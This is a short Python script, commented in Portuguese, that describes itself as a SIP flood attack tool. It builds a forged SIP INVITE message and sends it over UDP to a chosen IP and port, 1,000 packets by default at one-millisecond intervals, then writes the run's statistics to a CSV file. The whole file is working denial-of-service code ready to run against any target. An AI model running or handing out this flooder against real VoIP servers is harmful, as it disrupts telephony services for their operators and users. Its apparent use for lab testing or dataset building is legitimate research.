import socket
import time
import csv
import os
import argparse
from datetime import datetime

# Argumentos de linha de comando
parser = argparse.ArgumentParser(description="Ataque SIP Flood via socket.")
parser.add_argument("--ip", required=True, help="IP de destino")
parser.add_argument("--porta", type=int, default=5060, help="Porta de destino (padrão: 5060)")
parser.add_argument("--pacotes", type=int, default=1000, help="Número de pacotes a enviar")
parser.add_argument("--intervalo", type=float, default=0.001, help="Intervalo entre pacotes em segundos")
args = parser.parse_args()

# Criação do pacote SIP genérico
mensagem_sip = f"""INVITE sip:ataque@{args.ip} SIP/2.0
Via: SIP/2.0/UDP 192.168.0.100:{args.porta};branch=z9hG4bK-attack
From: <sip:ataque@{args.ip}>;tag=12345
To: <sip:ataque@{args.ip}>
Call-ID: ataque-{{}}@192.168.0.100
CSeq: 1 INVITE
Contact: <sip:ataque@192.168.0.100>
Max-Forwards: 70
User-Agent: SIPFloodTool
Content-Length: 0

"""

# Garante que a pasta results existe
os.makedirs("results", exist_ok=True)

# Inicializa socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Início do ataque
inicio = datetime.now()
print(f"\n🚀 Iniciando SIP Flood em {args.ip}:{args.porta} com {args.pacotes} pacotes...")

for i in range(1, args.pacotes + 1):
    pacote = mensagem_sip.format(i)
    sock.sendto(pacote.encode(), (args.ip, args.porta))

    if i % 100 == 0 or i == args.pacotes:
        print(f"📤 Pacote {i} enviado")

    time.sleep(args.intervalo)

# Fim do ataque
fim = datetime.now()
duracao = (fim - inicio).total_seconds()
print(f"\n✅ Ataque finalizado. Foram enviados {args.pacotes} pacotes para {args.ip}:{args.porta}.")

# Salvar resultados no CSV
dataset_path = "results/flood_sip_resultados.csv"
with open(dataset_path, mode="w", newline="") as csvfile:
    writer = csv.writer(csvfile)
    writer.writerow([
        "timestamp_inicio",
        "timestamp_fim",
        "ip_destino",
        "porta_destino",
        "quantidade_pacotes",
        "intervalo_entre_pacotes",
        "duracao_segundos"
    ])
    writer.writerow([
        inicio.strftime("%Y-%m-%d %H:%M:%S"),
        fim.strftime("%Y-%m-%d %H:%M:%S"),
        args.ip,
        args.porta,
        args.pacotes,
        args.intervalo,
        round(duracao, 2)
    ])

print(f"📂 Resultados do ataque salvos em {dataset_path}")
